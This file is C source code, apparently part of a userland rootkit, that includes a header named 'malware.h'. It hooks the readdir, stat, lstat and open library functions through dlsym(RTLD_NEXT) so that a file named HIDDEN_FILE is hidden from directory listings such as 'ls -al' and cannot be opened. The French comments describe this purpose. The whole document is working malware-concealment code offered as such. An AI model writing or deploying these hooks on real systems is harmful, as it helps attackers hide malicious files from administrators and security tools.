
#include "headers/malware.h"



//pour remplacer la fonction readdir "ls"

struct dirent *readdir(DIR *dir) {
    static struct dirent *(*orig_readdir)(DIR *) = NULL;
    if (!orig_readdir) orig_readdir = (struct dirent *(*)(DIR *))dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dir))) {
        if (strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}


//pour bloquer l'acces au fichier avec ls -al
int stat(const char *pathname, struct stat *statbuf) {
    static int (*orig_stat)(const char *, struct stat *) = NULL;
    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");

    if (strstr(pathname, HIDDEN_FILE)) {
        return -1;  // Fichier introuvable
    }

    return orig_stat(pathname, statbuf);
}

// Hook de lstat() -> Cache pour "ls -al"
int lstat(const char *pathname, struct stat *statbuf) {
    static int (*orig_lstat)(const char *, struct stat *) = NULL;
    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");

    if (strstr(pathname, HIDDEN_FILE)) {
        return -1;
    }

    return orig_lstat(pathname, statbuf);
}

// Hook de open() -> Empêche l'ouverture
int open(const char *pathname, int flags, ...) {
    static int (*orig_open)(const char *, int, ...) = NULL;
    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");

    if (strstr(pathname, HIDDEN_FILE)) {
        return -1;
    }

    return orig_open(pathname, flags);
}
